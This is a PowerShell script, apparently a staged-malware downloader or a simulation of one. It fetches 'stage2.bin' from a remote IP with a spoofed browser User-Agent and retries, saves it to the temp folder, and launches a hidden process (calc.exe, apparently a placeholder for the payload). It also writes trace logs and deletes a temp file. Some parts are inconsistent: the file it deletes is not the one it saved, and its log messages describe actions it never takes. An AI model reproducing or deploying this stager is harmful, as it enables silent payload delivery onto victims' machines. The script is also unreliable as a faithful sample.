[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://203.0.113.65:443/stage2.bin',
    [string]$PayloadPath = "$env:TEMP\payload.bin",
    [string]$TracePath = "$env:TEMP\telemetry.json",
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$TimeoutSec = 59,
    [int]$MaxAttempts = 5,
    [int]$BackoffSeconds = 10
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

function Resolve-StageEndpoint {
    param(
        [string]$CandidateUrl = ""
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$RetryCount = 5,
        [int]$RetryDelay = 10,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $Stage1Url
    $ResultObject = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $PayloadPath -RetryCount $MaxAttempts -RetryDelay $BackoffSeconds -UserAgent $RequestAgent
    if ($ResultObject) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $Stage1Url
    Destination = $PayloadPath
    RetryCount = $MaxAttempts
    TimeoutSec = $TimeoutSec
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Starting workflow"
Write-Verbose "Operation completed"
Write-Verbose "Checking local path"
Write-Verbose "Collecting host metadata"
Write-Verbose "Validating result"
Write-Verbose "Inspecting process list"
Write-Verbose "Writing diagnostic marker"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
